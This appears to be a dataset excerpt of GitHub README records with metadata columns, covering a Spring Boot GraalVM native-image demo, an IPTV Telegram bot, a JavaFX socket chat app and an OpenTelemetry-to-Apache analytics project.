7. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
   terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

   It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

8. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

### (Optional) Use Multistage Docker Builds to Build a Native Image and Package it in a Lightweight Container

The following steps (9-12) are for all platforms - MacOS, Windows, and Linux.

For MacOS and Windows, to build a Docker image containing your native executable, you need to build the native
executable inside a Docker container. To do this, we've provided
a [multistage Docker build file](./Dockerfiles/Dockerfile).

9. Run this command to build the native executable within a Docker container:

    ```shell
    docker build -f Dockerfiles/Dockerfile -t jibber-benchmark:native.0.0.1-SNAPSHOT .
    ```

10. Run the application:

    ```shell
    docker run --rm --name native -p 8080:8080 jibber-benchmark:native.0.0.1-SNAPSHOT
    ```

11. Open the application [http://localhost:8080/jibber](http://localhost:8080/jibber) in a browser, or from a new
    terminal window, call the endpoint using `curl`:

    ```shell
    curl http://localhost:8080/jibber
    ```

    It should generate a random nonsense verse in the style of the poem Jabberwocky by Lewis Carrol.

12. To stop the application, first get the container id using `docker ps`, and then run:

    ```shell
    docker rm -f <container_id>
    ```

## Measure the Performance of the Application and Metrics

The Spring Actuator dependency has been added to the project, along with support for Prometheus. If you want to test the
performance of either the JVM version, or the native executable version of the application, you can make use of the
Prometheus support. If you are hosting the application locally, it is available on port 8080:

[http://localhost:8080/actuator/prometheus](http://localhost:8080/actuator/prometheus)

## Related Documentation

- Run an interactive
  lab: [Level Up your Spring Boot Java Application with GraalVM](https://luna.oracle.com/lab/268ea851-2f09-43e6-8d70-40a10cb4de03)
- [Maven Build Plugin for GraalVM Native Image](https://graalvm.github.io/native-build-tools/latest/maven-plugin.html/)
- [Spring Boot GraalVM Native Image Support](https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html)
",10,0,1,mit,0.0,"['spring', 'boot', 'native', 'image', 'microservice', 'demo', 'show', 'build', 'package', 'run', 'simple', 'spring', 'boot', 'microservice', 'jar', 'file', 'graalvm', 'jdk', 'native', 'executable', 'graalvm', 'native', 'image', 'benefit', 'using', 'native', 'executable', 'faster', 'time', 'reduced', 'memory', 'consumption', 'also', 'demonstrates', 'run', 'application', 'build', 'native', 'executable', 'within', 'docker', 'container', 'two', 'way', 'generate', 'native', 'executable', 'spring', 'boot', 'application', 'using', 'graalvm', 'native', 'build', 'tool', 'using', 'buildpacks', 'sample', 'application', 'example', 'minimal', 'api', 'application', 'built', 'top', 'spring', 'boot', 'consists', 'main', 'spring', 'boot', 'class', 'also', 'rest', 'controller', 'serf', 'http', 'request', 'utility', 'class', 'implement', 'logic', 'application', 'call', 'http', 'endpoint', 'return', 'nonsense', 'verse', 'generated', 'style', 'jabberwocky', 'poem', 'lewis', 'carroll', 'program', 'achieves', 'using', 'markov', 'chain', 'model', 'original', 'poem', 'essentially', 'statistical', 'model', 'model', 'generates', 'new', 'text', 'example', 'application', 'provides', 'text', 'poem', 'generates', 'model', 'text', 'application', 'us', 'generate', 'new', 'text', 'similar', 'original', 'text', 'application', 'us', 'rita', 'library', 'external', 'dependency', 'build', 'use', 'markov', 'chain', 'default', 'demo', 'us', 'native', 'build', 'tool', 'maven', 'plugin', 'perform', 'task', 'would', 'like', 'run', 'demo', 'using', 'buildpacks', 'build', 'configuration', 'provided', 'prerequisite', 'download', 'install', 'latest', 'graalvm', 'jdk', 'using', 'sdkman', 'optional', 'install', 'run', 'compatible', 'container', 'runtime', 'rancher', 'desktop', 'docker', 'podman', 'using', 'docker', 'configure', 'allow', 'user', 'access', 'linux', 'download', 'demo', 'repository', 'clone', 'follows', 'change', 'directory', 'demo', 'subdirectory', 'application', 'jar', 'build', 'run', 'jar', 'demo', 'built', 'using', 'maven', 'build', 'application', 'top', 'jvm', 'generates', 'runnable', 'jar', 'file', 'contains', 'application', 'dependency', 'also', 'correctly', 'configured', 'file', 'run', 'application', 'jar', 'put', 'background', 'appending', 'open', 'application', 'http', 'browser', 'call', 'endpoint', 'using', 'generate', 'random', 'nonsense', 'verse', 'style', 'poem', 'jabberwocky', 'lewis', 'carrol', 'bring', 'application', 'foreground', 'using', 'enter', 'terminate', 'application', 'optional', 'containerize', 'jar', 'following', 'step', 'show', 'easily', 'containerize', 'jar', 'built', 'previous', 'step', 'using', 'oracle', 'graalvm', 'jdk', 'container', 'image', 'run', 'command', 'package', 'jar', 'docker', 'container', 'run', 'container', 'open', 'application', 'http', 'browser', 'new', 'terminal', 'window', 'call', 'endpoint', 'using', 'get', 'random', 'nonsense', 'verse', 'style', 'poem', 'jabberwocky', 'lewis', 'carrol', 'stop', 'application', 'first', 'get', 'container', 'id', 'using', 'run', 'native', 'executable', 'recap', 'far', 'built', 'spring', 'boot', 'application', 'http', 'endpoint', 'successfully', 'containerised', 'look', 'create', 'native', 'executable', 'application', 'spring', 'boot', 'support', 'graalvm', 'native', 'image', 'make', 'easy', 'compile', 'spring', 'boot', 'application', 'native', 'executable', 'native', 'executable', 'start', 'faster', 'also', 'us', 'far', 'fewer', 'resource', 'running', 'application', 'jar', 'file', 'use', 'tool', 'graalvm', 'installation', 'build', 'native', 'executable', 'example', 'use', 'graalvm', 'native', 'build', 'tool', 'maven', 'build', 'native', 'executable', 'default', 'native', 'build', 'configuration', 'make', 'sure', 'using', 'order', 'inherit', 'profile', 'plugin', 'see', 'following', 'maven', 'file', 'profile', 'graalvm', 'reachability', 'metadata', 'enabled', 'default', 'build', 'run', 'native', 'executable', 'profile', 'active', 'invoke', 'goal', 'trigger', 'compilation', 'run', 'following', 'command', 'profile', 'used', 'generate', 'native', 'executable', 'platform', 'native', 'executable', 'called', 'generated', 'target', 'directory', 'alternatively', 'build', 'using', 'buildpacks', 'run', 'command', 'generate', 'native', 'executable', 'information', 'using', 'buildpacks', 'create', 'native', 'executable', 'see', 'building', 'native', 'image', 'using', 'buildpacks', 'run', 'native', 'executable', 'put', 'background', 'appending', 'open', 'application', 'http', 'browser', 'call', 'endpoint', 'using', 'get', 'random', 'nonsense', 'verse', 'style', 'poem', 'jabberwocky', 'lewis', 'carrol', 'bring', 'application', 'foreground', 'using', 'enter', 'terminate', 'application', 'log', 'output', 'notice', 'much', 'quicker', 'native', 'executable', 'version', 'spring', 'boot', 'application', 'start', 'compared', 'jar', 'native', 'executable', 'also', 'us', 'fewer', 'resource', 'running', 'jar', 'file', 'additional', 'native', 'build', 'configuration', 'notice', 'pas', 'additional', 'configuration', 'argument', 'underlying', 'build', 'tool', 'using', 'section', 'individual', 'tag', 'pas', 'parameter', 'exactly', 'way', 'command', 'line', 'let', 'use', 'parameter', 'work', 'tool', 'maven', 'add', 'following', 'snippet', 'pas', 'additional', 'argument', 'enable', 'verbose', 'output', 'quick', 'build', 'mode', 'etc', 'profile', 'build', 'run', 'native', 'executable', 'let', 'rebuild', 'native', 'executable', 'additional', 'configuration', 'argument', 'run', 'following', 'command', 'quick', 'build', 'mode', 'enabled', 'take', 'less', 'time', 'build', 'native', 'executable', 'mode', 'used', 'development', 'faster', 'build', 'run', 'native', 'executable', 'put', 'background', 'appending', 'open', 'application', 'http', 'browser', 'call', 'endpoint', 'using', 'get', 'random', 'nonsense', 'verse', 'style', 'poem', 'jabberwocky', 'lewis', 'carrol', 'bring', 'application', 'foreground', 'using', 'enter', 'terminate', 'application', 'log', 'output', 'notice', 'much', 'quicker', 'native', 'executable', 'version', 'spring', 'boot', 'application', 'start', 'compared', 'jar', 'native', 'executable', 'also', 'us', 'fewer', 'resource', 'running', 'jar', 'file', 'optional', 'containerize', 'native', 'executable', 'linux', 'following', 'step', 'linux', 'linux', 'easily', 'containerise', 'native', 'executable', 'using', 'following', 'command', 'run', 'application', 'open', 'application', 'http', 'browser', 'new', 'terminal', 'window', 'call', 'endpoint', 'using', 'generate', 'random', 'nonsense', 'verse', 'style', 'poem', 'jabberwocky', 'lewis', 'carrol', 'stop', 'application', 'first', 'get', 'container', 'id', 'using', 'run', 'optional', 'use', 'multistage', 'docker', 'build', 'build', 'native', 'image', 'package', 'lightweight', 'container', 'following', 'step', 'platform', 'macos', 'window', 'linux', 'macos', 'window', 'build', 'docker', 'image', 'containing', 'native', 'executable', 'need', 'build', 'native', 'executable', 'inside', 'docker', 'container', 'provided', 'multistage', 'docker', 'build', 'file', 'run', 'command', 'build', 'native', 'executable', 'within', 'docker', 'container', 'run', 'application', 'open', 'application', 'http', 'browser', 'new', 'terminal', 'window', 'call', 'endpoint', 'using', 'generate', 'random', 'nonsense', 'verse', 'style', 'poem', 'jabberwocky', 'lewis', 'carrol', 'stop', 'application', 'first', 'get', 'container', 'id', 'using', 'run', 'measure', 'performance', 'application', 'metric', 'spring', 'actuator', 'dependency', 'added', 'project', 'along', 'support', 'prometheus', 'want', 'test', 'performance', 'either', 'jvm', 'version', 'native', 'executable', 'version', 'application', 'make', 'use', 'prometheus', 'support', 'hosting', 'application', 'locally', 'available', 'port', 'http', 'related', 'documentation', 'run', 'interactive', 'lab', 'level', 'spring', 'boot', 'java', 'application', 'graalvm', 'maven', 'build', 'plugin', 'graalvm', 'native', 'image', 'spring', 'boot', 'graalvm', 'native', 'image', 'support']","['native', 'application', 'executable', 'build', 'using']",5,1,0,"['spring', 'boot', 'native', 'image', 'microservice', 'sample', 'application', 'prerequisite', 'application', 'jar', 'build', 'run', 'jar', 'optional', 'containerize', 'jar', 'native', 'executable', 'default', 'native', 'build', 'configuration', 'build', 'run', 'native', 'executable', 'additional', 'native', 'build', 'configuration', 'build', 'run', 'native', 'executable', 'optional', 'containerize', 'native', 'executable', 'linux', 'optional', 'use', 'multistage', 'docker', 'build', 'build', 'native', 'image', 'package', 'lightweight', 'container', 'measure', 'performance', 'application', 'metric', 'related', 'documentation']",15,"['native', 'build', 'executable', 'application', 'jar']",27,0.0,1.0,"[org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,13663,21.858695652173918,4.968175037294878,"['Using GraalVM Native Build Tools -> https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.native-build-tools', 'Using Buildpacks -> https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks', 'RiTa library -> https://rednoise.org/rita/', 'Native Build Tools Maven plugin -> https://graalvm.github.io/native-build-tools/latest/maven-plugin.html', 'BuildPacks -> https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks', 'SDKMAN! -> https://sdkman.io/', 'Rancher Desktop -> https://docs.rancherdesktop.io/getting-started/installation/', 'Docker -> https://www.docker.io/gettingstarted/', 'Podman -> https://podman.io/docs/installation', 'allow non-root user access -> https://docs.docker.com/engine/install/linux-postinstall/#manage-docker-as-a-non-root-user', 'http://localhost:8080/jibber -> http://localhost:8080/jibber', 'http://localhost:8080/jibber -> http://localhost:8080/jibber', 'GraalVM Native Build Tools for Maven -> https://graalvm.github.io/native-build-tools/latest/maven-plugin.html', 'GraalVM Reachability Metadata -> https://www.graalvm.org/native-image/libraries-and-frameworks/', 'Building a Native Image Using Buildpacks -> https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks', 'http://localhost:8080/jibber -> http://localhost:8080/jibber', 'http://localhost:8080/jibber -> http://localhost:8080/jibber', 'http://localhost:8080/jibber -> http://localhost:8080/jibber', 'http://localhost:8080/jibber -> http://localhost:8080/jibber', 'http://localhost:8080/actuator/prometheus -> http://localhost:8080/actuator/prometheus', 'Level Up your Spring Boot Java Application with GraalVM -> https://luna.oracle.com/lab/268ea851-2f09-43e6-8d70-40a10cb4de03', 'Maven Build Plugin for GraalVM Native Image -> https://graalvm.github.io/native-build-tools/latest/maven-plugin.html/', 'Spring Boot GraalVM Native Image Support -> https://docs.spring.io/spring-boot/docs/current/reference/html/native-image.html']",23
ShafiqSadat/IPTVTelegramBot,master,"# IPTV Telegram Bot

IPTV Telegram Bot is a bot that lets you watch IPTV streams right in Telegram App. IPTV stands for Internet Protocol Television, which is a way of delivering live TV channels over the internet. With this bot, you can send the name of the channel you want to watch, and the bot will respond with available streams to watch. There are over 60000+ online streams from all over the world, covering various genres and languages.

![Screenshot of IPTV Telegram Bot](https://i.imgur.com/XVsp1Nd.png)

![Screenshot of IPTV Telegram Bot](https://raw.githubusercontent.com/ShafiqSadat/IPTVTelegramBot/master/screenshots/1.gif)
## How to use

- Clone this repository or download the zip file.
- Install the requirements using `mvn install`.
- Create a bot using [@BotFather](https://t.me/BotFather) and get the bot token.
- In BotFather, send the ""/setmenubutton"" command, select your bot, and send the following link: ```https://iptvnator.vercel.app/```. Then, provide a name for the button, such as ""Open Player.""
- Rename example_local.properties into local.properties under /src/main/resources/example_local.properties
- Edit the local.properties file and enter your bot token and username.
- Run the Main.java file using `java Main`.
- Start your bot and enjoy watching IPTV streams.

## Credits

- IPTV API: [iptv-org/iptv](https://github.com/iptv-org/iptv)
- Telegram API: [rubenlagus/TelegramBots](https://github.com/rubenlagus/TelegramBots)
- IPTV Player: [4gray/iptvnator](https://github.com/4gray/iptvnator)

## License

This project is licensed under the MIT License - see the [LICENSE] file for details.

## Contributing

If you want to contribute to this project, you are welcome to do so. Please follow these steps:

- Fork this repository and create a new branch for your feature or bug fix.
- Write your code and test it locally.
- Commit and push your changes to your forked repository.
- Create a pull request with a clear description of your changes and a link to the issue (if any) that you are addressing.
- Wait for the maintainer to review and merge your pull request.

## Contact

If you have any questions, suggestions, or feedback, you can contact me via:

- Email: ShafiqSadat2012@gmail.com
- Telegram: [@Shafiq](https://t.me/Shafiq)

## License
IPTVTelegramBot is licensed under the MIT License. The terms are as follows:

```
The MIT License (MIT)

Copyright (c) 2024 Shafiq Sadat

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
",1,0,1,mit,0.0,"['iptv', 'telegram', 'bot', 'iptv', 'telegram', 'bot', 'bot', 'let', 'watch', 'iptv', 'stream', 'right', 'telegram', 'app', 'iptv', 'stand', 'internet', 'protocol', 'television', 'way', 'delivering', 'live', 'tv', 'channel', 'internet', 'bot', 'send', 'name', 'channel', 'want', 'watch', 'bot', 'respond', 'available', 'stream', 'watch', 'online', 'stream', 'world', 'covering', 'various', 'genre', 'language', 'use', 'clone', 'repository', 'download', 'zip', 'file', 'install', 'requirement', 'using', 'create', 'bot', 'using', 'botfather', 'get', 'bot', 'token', 'botfather', 'send', 'command', 'select', 'bot', 'send', 'following', 'link', 'provide', 'name', 'button', 'open', 'player', 'rename', 'edit', 'file', 'enter', 'bot', 'token', 'username', 'run', 'file', 'using', 'start', 'bot', 'enjoy', 'watching', 'iptv', 'stream', 'credit', 'iptv', 'api', 'telegram', 'api', 'iptv', 'player', 'license', 'project', 'licensed', 'mit', 'license', 'see', 'license', 'file', 'detail', 'contributing', 'want', 'contribute', 'project', 'welcome', 'please', 'follow', 'step', 'fork', 'repository', 'create', 'new', 'branch', 'feature', 'bug', 'fix', 'write', 'code', 'test', 'locally', 'commit', 'push', 'change', 'forked', 'repository', 'create', 'pull', 'request', 'clear', 'description', 'change', 'link', 'issue', 'addressing', 'wait', 'maintainer', 'review', 'merge', 'pull', 'request', 'contact', 'question', 'suggestion', 'feedback', 'contact', 'via', 'email', 'telegram', 'shafiq', 'license', 'iptvtelegrambot', 'licensed', 'mit', 'license', 'term', 'follows']","['bot', 'iptv', 'telegram', 'license', 'stream']",2,0,0,"['iptv', 'telegram', 'bot', 'how', 'use', 'credit', 'license', 'contribute', 'contact', 'license']",7,"['license', 'iptv', 'telegram', 'bot', 'how']",2,0.0,1.0,[],0.0,1.0,0.0,3449,20.807692307692307,4.955637707948244,"['Screenshot of IPTV Telegram Bot -> https://i.imgur.com/XVsp1Nd.png', 'Screenshot of IPTV Telegram Bot -> https://raw.githubusercontent.com/ShafiqSadat/IPTVTelegramBot/master/screenshots/1.gif', '@BotFather -> https://t.me/BotFather', 'iptv-org/iptv -> https://github.com/iptv-org/iptv', 'rubenlagus/TelegramBots -> https://github.com/rubenlagus/TelegramBots', '4gray/iptvnator -> https://github.com/4gray/iptvnator', '@Shafiq -> https://t.me/Shafiq', 'LICENSE']",8
sasmithx/Chat_Application_Socket_Progrmming,master,"![Logo](https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Client-Server-Network-Model.jpg)

# PLAY TECH PVT LTD.

This project is a simple chat application built using Java Socket programming. It features a client-server architecture, enabling real-time text and image communication between multiple clients. The application also includes an emoji picker, allowing users to send emojis in their chat messages.

## Table of Contents

- Features
- Technologies Used
- Setup
- How to Run
- Usage
- Screenshots
- Contributing
- License
- Contact

## Features

- Real-time text communication between clients.
- Ability to send and receive images.
- Emoji picker for sending emojis in chat.
- User authentication based on a simple name validation.
- Responsive and intuitive user interface.

## Technologies Used

- **Java:** Core programming language.
- **JavaFX:** Used for the graphical user interface.
- **Socket Programming:** Used for client-server communication.
- **FXML:** For defining the UI layout.
- **CSS:** For styling the UI components.

## Setup

To set up the project locally, follow these steps:

**1.** **Clone the repository:**
```bash
https://github.com/sasmithx/Chat_Application_Socket_Progrmming.git
```
**2.** **Import the project:**

- Open your favorite IDE (like IntelliJ IDEA, Eclipse, or NetBeans).
- Import the project as a Maven/Gradle project.
- Ensure that the JavaFX library is properly configured in your IDE.

**3.** **Configure JavaFX:**

- Download JavaFX SDK if you haven't already.
- Configure the JavaFX SDK path in your project settings.

## How to Run

**1.** **Run the Server:**

- Run the Server.java file to start the server.
- The server will start listening on port 5003 by default.


**2.** **Run the Client:**

- Run the ClientController.java file to start the client.
- Enter your username in the login screen.
- Start chatting with other connected clients.

## Usage

- **Login:** Enter a username (between 4 and 15 alphabetic characters) to join the chat.
- **Send a Message:** Type your message in the input field and press enter or click the send button.
- **Send an Image:** Click on the image icon to select and send an image.
- **Send an Emoji:** Click on the emoji icon to select and send an emoji.
- **Receive Messages:** All incoming messages, images, and emojis will be displayed in the chat window.

## Screenshots

<img src=""https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Screenshots/Screenshot%202024-08-22%20184323.png"" width=""600px"" height=""auto"">

<img src=""https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Screenshots/Screenshot%202024-08-22%20184245.png"" width=""600px"" height=""auto"">

## Contributing

Contributions are welcome! Please fork this repository and submit a pull request with your changes.


## License

This project is licensed under the MIT License - see the [MIT License](LICENSE)  file for details.

## 
<br>

<div align=""center""> 
<a href=""https://github.com/sasmithx"" target=""_blank""><img src = ""https://img.shields.io/badge/GitHub-000000?style=for-the-badge&logo=github&logoColor=white""></a>
<a href=""https://git-scm.com/"" target=""_blank""><img src = ""https://img.shields.io/badge/Git-000000?style=for-the-badge&logo=git&logoColor=white""></a>
<a href=""https://maven.apache.org/download.cgi"" target=""_blank""><img src = ""https://img.shields.io/badge/Maven-000000?style=for-the-badge&logo=apachemaven&logoColor=white""></a>
<a href=""https://www.jetbrains.com/idea/download/?section=windows"" target=""_blank""><img src = ""https://img.shields.io/badge/intellij-000000?style=for-the-badge&logo=intellijidea&logoColor=white""></a>
<a href=""https://www.asus.com/lk/"" target=""_blank""><img src = ""https://img.shields.io/badge/asus%20laptop-000000?style=for-the-badge&logo=asus&logoColor=white""
<a href=""https://ubuntu.com/"" target=""_blank""><img src = ""https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white""
                                                
</div>

<br>

<p align=""center"">
  &copy; 2024 Sasmith Manawadu
</p>

",0,0,1,mit,0.0,"['play', 'tech', 'pvt', 'ltd', 'project', 'simple', 'chat', 'application', 'built', 'using', 'java', 'socket', 'programming', 'feature', 'architecture', 'enabling', 'text', 'image', 'communication', 'multiple', 'client', 'application', 'also', 'includes', 'emoji', 'picker', 'allowing', 'user', 'send', 'emojis', 'chat', 'message', 'table', 'content', 'feature', 'technology', 'used', 'setup', 'run', 'usage', 'screenshots', 'contributing', 'license', 'contact', 'feature', 'text', 'communication', 'client', 'ability', 'send', 'receive', 'image', 'emoji', 'picker', 'sending', 'emojis', 'chat', 'user', 'authentication', 'based', 'simple', 'name', 'validation', 'responsive', 'intuitive', 'user', 'interface', 'technology', 'used', 'java', 'core', 'programming', 'language', 'javafx', 'used', 'graphical', 'user', 'interface', 'socket', 'programming', 'used', 'communication', 'fxml', 'defining', 'ui', 'layout', 'cs', 'styling', 'ui', 'component', 'setup', 'set', 'project', 'locally', 'follow', 'step', 'clone', 'repository', 'import', 'project', 'open', 'favorite', 'ide', 'like', 'intellij', 'idea', 'eclipse', 'netbeans', 'import', 'project', 'project', 'ensure', 'javafx', 'library', 'properly', 'configured', 'ide', 'configure', 'javafx', 'download', 'javafx', 'sdk', 'already', 'configure', 'javafx', 'sdk', 'path', 'project', 'setting', 'run', 'run', 'server', 'run', 'file', 'start', 'server', 'server', 'start', 'listening', 'port', 'default', 'run', 'client', 'run', 'file', 'start', 'client', 'enter', 'username', 'login', 'screen', 'start', 'chatting', 'connected', 'client', 'usage', 'login', 'enter', 'username', 'alphabetic', 'character', 'join', 'chat', 'send', 'message', 'type', 'message', 'input', 'field', 'press', 'enter', 'click', 'send', 'button', 'send', 'image', 'click', 'image', 'icon', 'select', 'send', 'image', 'send', 'emoji', 'click', 'emoji', 'icon', 'select', 'send', 'emoji', 'receive', 'message', 'incoming', 'message', 'image', 'emojis', 'displayed', 'chat', 'window', 'screenshots', 'contributing', 'contribution', 'welcome', 'please', 'fork', 'repository', 'submit', 'pull', 'request', 'change', 'license', 'project', 'licensed', 'mit', 'license', 'see', 'mit', 'license', 'file', 'detail']","['send', 'project', 'image', 'run', 'chat']",0,0,0,"['play', 'tech', 'pvt', 'ltd', 'table', 'content', 'feature', 'technology', 'use', 'setup', 'how', 'run', 'usage', 'screenshots', 'contribute', 'license']",10,"['play', 'tech', 'pvt', 'ltd', 'table']",1,0.0,1.0,[],0.0,1.0,0.0,4191,15.487179487179487,5.122516556291391,['Logo -> https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Client-Server-Network-Model.jpg'],1
mishmash-io/opentelemetry-server-embedded,main,"# OpenTelemetry and Apache Big Data, United by mishmash io

This repository contains code that receives and adapts [OpenTelemetry](https://opentelemetry.io/) signals - like `logs`, `metrics`, `traces` and `profiles` - to Open Source projects of the [Apache](https://www.apache.org/) analytics ecosystem.

**Blend** and **bundle** them to build your own **Observability analytics backends:**
- for batch processing with Apache Spark or Hive
- for real-time analytics with Apache Druid and Apache Superset
- for Machine Learning and AI

You will also find additional tools, examples and demos that might be of service on your own OpenTelemetry journey.

> [!TIP]
> This is a public release of code we have accumulated internally over time and so far contains only a limited subset of what we intend to share.
>
> Examples of internal software that will be published here in the near future include:
> 
> - A small OTLP server based on [Apache BookKeeper](https://bookkeeper.apache.org/) for improved
>   data ingestion reliability, even across node failures
> - OpenTelemetry Data Sources for [Apache Pulsar](https://pulsar.apache.org/) for when more
>   more complex preprocessing is needed
> - Our [Testcontainers](https://testcontainers.com/) implementations that you can use to
>   ensure your apps always produce the necessary telemetry, or to track performance across
>   releases
>
> Watch this repository for updates.

***Contents:***

- [How OpenTelemetry compares to other telemetry software](#why-you-should-switch-to-opentelemetry)
- [Introduction to OpenTelemetry for Developers, Data Engineers and Data Scientists](#opentelemetry-for-developers-data-engineers-and-data-scientists)
- [When and where should you use the code here](#when-and-where-should-you-use-the-software-in-this-repository)
- [Software artifacts to:](#artifacts)
  - [Embed OTLP collectors in Java systems](#embeddable-collectors)
  - [Save OpenTelemetry to Apache Parquet files](#apache-parquet-stand-alone-server)
  - [Ingest OpenTelemetry into Apache Druid](#apache-druid-otlp-input-format)
  - [Visualize OpenTelemetry with Apache Superset](#apache-superset-charts-and-dashboards)
- [More about OpenTelemetry at mishmash io](#opentelemetry-at-mishmash-io)

# Why you should switch to OpenTelemetry

If you are new to OpenTelemetry you might be thinking how is it better than the multitude of
existing telemetry implementations, many of which are already available or well established within
popular runtimes like Kubernetes, for example.

There are a number of advantages that OpenTelemetry offers compared to earlier telemetries:

- All signal types (`logs`, `metrics`, `traces` and `profiles`) are ***correlatable:***
  
  For exmpale - you can explore ***only*** the `logs` emitted inside a given (potentially failing) `span`.

  To see how `telemetry signal correlation` works - refer to the [OpenTelemetry for Developers, Data Engineers and Data Scientists](#opentelemetry-for-developers-data-engineers-and-data-scientists) examples section below.
- More precise timing:
  
  Unlike other telemetries, OpenTelemetry does not `pull` data, it `pushes` it. By avoiding the
  extra request needed to pull data - OpenTelemetry reports much more accurate timestamps of
  when `logs` or `spans` and other events where emitted, or `metrics` values were updated.
- Zero-code telemetry:
  
  You can add telemetry to your existing apps without any code modifications. If you're using
  popular frameworks - they already have OpenTelemetry instrumentation that will just work out
  of the box. See the [OpenTelemetry docs for your programming language.](https://opentelemetry.io/docs/languages/)

  Also, you do not need to implement special endpoints and request handlers to supply telemetry.
- No CPU overhead if telemetry is not emitted:
  
  When code instrumented with OpenTelemetry runs ***without*** a configured signals exporter
  (basically when it is disabled) - all OpenTelemetry API methods are basically empty.

  They do not perform any operations, thus not requiring any CPU. 
- Major companies already support OpenTelemetry:
  
  Large infrastructure providers - public clouds like Azure, AWS and GCP already seamlessly integrate their monitoring and observability services with OpenTelemetry.
  
  Instrumenting your code with OpenTelemetry means it can be monitored on any of them, without
  code changes.

If the above sounds convincing - keep reading through this document and explore the links in it.

# OpenTelemetry for Developers, Data Engineers and Data Scientists

We have prepared a few Jupyter notebooks that visually explore OpenTelemetry data that we collected from [a demo Astronomy webshop app](https://github.com/mishmash-io/opentelemetry-demos)
using the [Apache Parquet Stand-alone server](./server-parquet) contained in this repository.

> [!TIP]
> If you are the sort of person who prefers to learn by looking at **actual data** - start with the [OpenTelemetry Basics Notebook.](./examples/notebooks/basics.ipynb)

# When and where should you use the software in this repository

We, at [mishmsah io,](https://mishmash.io/) have been using OpenTelemetry for quite some time - recording telemetry from experiments, unit and integration tests - to ensure every new release
of software we develop is performing better than the last, and within reasonable computing-resource usage. (More on this [here.](https://mishmash.io/open_source/opentelemetry))

> [!TIP]
> OpenTelemetry is great for **monitoring software in production,** but we believe you should adopt it within your **software development process** too.

Having been through that journey ourselves, we've realised that success depends on strong analytics. OpenTelemetry provides a number of tools to [instrument your code](https://opentelemetry.io/docs/concepts/instrumentation/) to emit signals, and then to compose data transmission pipelines for these signals. And leaves it to you to decide what you ultimately want to do with your signals: where you want to store them depends on how you will work with them.

You can compose such pipelines for signals transmition using the [OpenTelemetry Collector,](https://opentelemetry.io/docs/collector/) which in turn uses a network protocol called [OTLP.](https://opentelemetry.io/docs/specs/otel/protocol/) At the end - you have to `terminate` the pipelines into an `observability (or OTLP) backend.`

As a network protocol, OTLP is great at reducing the number of bytes transmitted, keeping the throughput high with minimum overhead. It does this by heavily `nesting` its messages - to avoid
data duplication and take maximum advantage of `dictionary encodings` and data compression.

On the **analytics side** though - heavily nested structures are not optimal. A simple `count(*)` or
`sum()` query, done over millions of OTLP messages, will have to `unnest` each one of them. Every time you run that query.

And this is the second reason why we believe you might find the software here useful:

> [!TIP]
> When doing analytics on your observability data - you need a suitable data schema.
>
> The tools in this repository convert OTLP messages into a 'flatter' schema, that's more suitable
> for analytics.
>
> They preform transformations, **only once** - on **OTLP packet reception,** to minimize the overhead that would otherwise be incurred every time you run an analytics job or query.

Following are quick introductions of the individual software packages, where you can find more information.

> [!TIP]
> If you're wondering how to get your first OpenTelemetry data sets - check out [our fork of OpenTelemetry's Demo app.](https://github.com/mishmash-io/opentelemetry-demos)
>
> In there you will find complete deployments that will generate signals, save them and let you play with the data - by writing your own notebooks or creating
> Apache Superset dashboards.
> 

# Artifacts

## Embeddable collectors

The base artifact - `collector-embedded` contains classes that handle the OTLP protocol (over both gRPC and HTTP).
- [README](./collector-embedded)
- [Javadoc on javadoc.io](https://javadoc.io/doc/io.mishmash.opentelemetry/collector-embedded)

## Apache Parquet Stand-alone server

This artifact contains a runnable OTLP-protocol server that receives signals from OpenTelemetry and saves them into [Apache Paruqet](https://parquet.apache.org/) files.

It is not intended for production use, but rather as a quick tool to save and explore OpenTelemetry data locally. [The Basics Jupyter Notebook](./examples/notebooks/basics.ipynb) explores
Parquet files as saved by this Stand-alone server.
- [README](./server-parquet)
- [Javadoc on javadoc.io](https://javadoc.io/doc/io.mishmash.opentelemetry/server-parquet)
- [Quick deployment with a demo app](https://github.com/mishmash-io/opentelemetry-demos)

## Apache Druid OTLP Input Format

Use this artifact when ingesting OpenTelemetry signals into [Apache Druid](https://druid.apache.org), in combination with an Input Source (like Apache Kafka or other).

Apache Druid is a high performance, real-time analytics database that delivers sub-second queries on streaming and batch data at scale and under load. This makes it perfect for OpenTelemetry data analytics.

